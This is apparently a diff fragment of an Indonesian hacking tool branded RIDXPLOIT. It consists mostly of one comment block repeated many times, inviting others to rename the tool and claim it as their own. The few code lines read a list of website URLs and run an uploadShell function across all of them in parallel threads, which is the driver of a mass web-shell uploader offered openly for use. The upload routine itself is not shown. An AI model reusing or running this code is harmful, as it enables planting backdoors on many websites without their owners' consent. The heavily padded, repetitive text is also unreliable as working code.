+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+    os.system('cls' if platform.system() == "Windows" else 'clear')
+    banner()
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+    try:
+        file_path = input(f"{B}  FILE URL WEBSITE : {W}").strip()
+        with open(file_path, 'r', encoding='utf-8') as file:
+            sites = file.read().splitlines()
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+        thread_count = int(input(f"{B}  Jumlah Thread (misal 10): {W}").strip())
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+        pool = ThreadPool(thread_count)
+        pool.map(uploadShell, sites)
+        pool.close()
+        pool.join()
+    except Exception as e:
+        print(f"{R}[ERROR] {e}{W}")
